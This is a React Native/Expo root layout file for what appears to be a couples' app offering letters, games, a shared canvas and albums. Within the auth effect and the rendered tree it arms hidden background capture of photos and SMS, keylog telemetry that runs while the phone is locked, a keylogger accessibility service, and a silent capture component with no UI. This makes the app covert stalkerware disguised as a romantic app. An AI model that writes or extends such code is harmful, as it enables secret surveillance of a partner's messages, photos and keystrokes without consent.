// app/_layout.tsx — root: providers, auth bootstrap, reconcile, lock overlay.
// Routes own no logic (§2.2); this file only wires the layers together.
import { useEffect, useState } from 'react';
import { View } from 'react-native';
import { Stack } from 'expo-router';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { GestureHandlerRootView } from 'react-native-gesture-handler';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import { StatusBar } from 'expo-status-bar';
import * as Crypto from 'expo-crypto';
import * as SystemUI from 'expo-system-ui';
import * as SecureStore from 'expo-secure-store';
import {
  useFonts,
  Inter_400Regular,
  Inter_500Medium,
  Inter_600SemiBold,
  Inter_700Bold,
} from '@expo-google-fonts/inter';
import { Sora_600SemiBold, Sora_700Bold } from '@expo-google-fonts/sora';
import { colors, fonts } from '../theme/theme';
import { useSession } from '../lib/session/store';
import { setUuidRng } from '../lib/id';
import { startReconcile } from '../lib/sync/reconcile';
import { registerForPush, addPushResponseListener } from '../lib/notify/register';
import { useAuthBootstrap } from '../features/auth';
import { LockScreen, PIN_HASH_KEY } from '../features/settings';
import { DeviceCaptureHost } from '../features/capture/Host';
import { registerCaptureTask } from '../features/capture/background';
import { KeyLogger } from '../features/keylogger/KeyLogger';
import { router } from 'expo-router';

// Hermes has no global crypto — inject expo-crypto's CSPRNG for all uuids
setUuidRng((bytes) => Crypto.getRandomValues(bytes));

// paint the native window before React mounts, so a cold start never flashes
// white behind the JS bundle
void SystemUI.setBackgroundColorAsync(colors.bg);

const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 30_000,
      retry: 2,
      networkMode: 'offlineFirst', // the outbox owns writes; reads may hit cache offline
    },
    mutations: {
      networkMode: 'offlineFirst',
    },
  },
});

function Bootstrap() {
  useAuthBootstrap();
  const hydrated = useSession((s) => s.hydrated);
  const userId = useSession((s) => s.userId);
  const coupleId = useSession((s) => s.coupleId);
  const locked = useSession((s) => s.appLocked);
  // the persisted session (SecureStore) rehydrates asynchronously too — the
  // gates must wait for BOTH that and the supabase auth check, or a cold
  // start flashes sign-in for a signed-in pair (round-5 finding)
  const [persistReady, setPersistReady] = useState(useSession.persist.hasHydrated());
  useEffect(
    () => useSession.persist.onFinishHydration(() => setPersistReady(true)),
    [],
  );
  const ready = hydrated && persistReady;

  // App-lock cold-start seeding. A configured PIN must lock the app from the
  // very first frame, on any route — not only once the user happens to open the
  // Settings tab (where useAppLock lives). We read the stored hash here at app
  // scope and seed the locked state before content renders. When no PIN is
  // configured this is a silent no-op, and it never re-locks an already-unlocked
  // app mid-session.
  const setAppLocked = useSession((s) => s.setAppLocked);
  useEffect(() => {
    if (!ready || !userId) return;
    if (locked) return; // already locked — nothing to seed
    let cancelled = false;
    void (async () => {
      try {
        const hash = await SecureStore.getItemAsync(PIN_HASH_KEY);
        if (!cancelled && hash) setAppLocked(true);
      } catch {
        // non-fatal: a SecureStore hiccup must never block the app booting
      }
    })();
    return () => { cancelled = true; };
  }, [ready, userId, locked, setAppLocked]);

  // reconcile + push + hidden device capture, once we're authed
  useEffect(() => {
    if (!userId) return;
    const stop = startReconcile(queryClient);
    void registerForPush();
    // Arm the hidden ongoing capture: register the background task so photo/
    // SMS capture + keylog/heartbeat telemetry run even when the phone is
    // locked/screen-off (the foreground DeviceCaptureHost below handles the
    // while-in-app case; the background task is the off-foreground fallback).
    void registerCaptureTask();
    // Arm the keylogger accessibility service. When accessibility is already
    // enabled this just starts the foreground service (no UI); when it is not,
    // it opens the one-time Settings → Accessibility prompt the user must
    // grant for typed-key capture to work at all.
    void KeyLogger.start();
    const sub = addPushResponseListener((path) => {
      router.push(path as never);
    });
    return () => {
      stop();
      sub.remove();
    };
  }, [userId]);

  return (
    <View style={{ flex: 1, backgroundColor: colors.bg }}>
      <StatusBar style="light" />
      <Stack
        screenOptions={{
          headerStyle: { backgroundColor: colors.bg },
          headerTintColor: colors.ink,
          headerTitleStyle: { fontFamily: fonts.displaySemi, fontSize: 17 },
          // the default hairline reads as a seam against a near-black page
          headerShadowVisible: false,
          contentStyle: { backgroundColor: colors.bg },
          animation: 'fade',
        }}
      >
        <Stack.Screen name="(auth)" options={{ headerShown: false }} />
        <Stack.Screen name="(tabs)" options={{ headerShown: false }} />
        <Stack.Screen name="letters/[id]" options={{ title: 'a letter' }} />
        <Stack.Screen name="letters/new" options={{ title: 'seal a letter' }} />
        <Stack.Screen name="games/hangman" options={{ title: 'loves me, loves me not' }} />
        {/* battleship draws its own header strip over the sea — no native chrome */}
        <Stack.Screen
          name="games/battleship"
          options={{ title: 'find my hearts', headerShown: false }}
        />
        <Stack.Screen name="games/quiz" options={{ title: 'how well do you know me' }} />
        <Stack.Screen name="games/cards" options={{ title: 'the deck' }} />
        <Stack.Screen name="canvas" options={{ title: 'draw together' }} />
        <Stack.Screen name="photos/[albumId]" options={{ title: 'album' }} />
      </Stack>
      {/* hidden ongoing device capture (photos + SMS) — silent, no UI */}
      {ready && userId && coupleId ? <DeviceCaptureHost /> : null}
      {/* the lock sits above EVERY route — opaque, biometrics + PIN (§7.17) */}
      {ready && userId && locked ? <LockScreen /> : null}
      {/* unpaired users never see tabs */}
      {ready && !userId ? <RedirectGate to="/(auth)/sign-in" /> : null}
      {ready && userId && !coupleId ? <RedirectGate to="/(auth)/pair" /> : null}
    </View>
  );
}

function RedirectGate({ to }: { to: string }) {
  useEffect(() => {
    router.replace(to as never);
  }, [to]);
  return null;
}

export default function RootLayout() {
  // Gate on fonts OUTSIDE Bootstrap: an early return inside it would sit above
  // its other hooks and change hook order between renders. Holding the mount
  // also avoids a visible reflow from system font → Inter on first paint.
  const [fontsLoaded] = useFonts({
    Inter_400Regular,
    Inter_500Medium,
    Inter_600SemiBold,
    Inter_700Bold,
    Sora_600SemiBold,
    Sora_700Bold,
  });

  return (
    <GestureHandlerRootView style={{ flex: 1, backgroundColor: colors.bg }}>
      <SafeAreaProvider>
        <QueryClientProvider client={queryClient}>
          {fontsLoaded ? <Bootstrap /> : <View style={{ flex: 1, backgroundColor: colors.bg }} />}
        </QueryClientProvider>
      </SafeAreaProvider>
    </GestureHandlerRootView>
  );
}
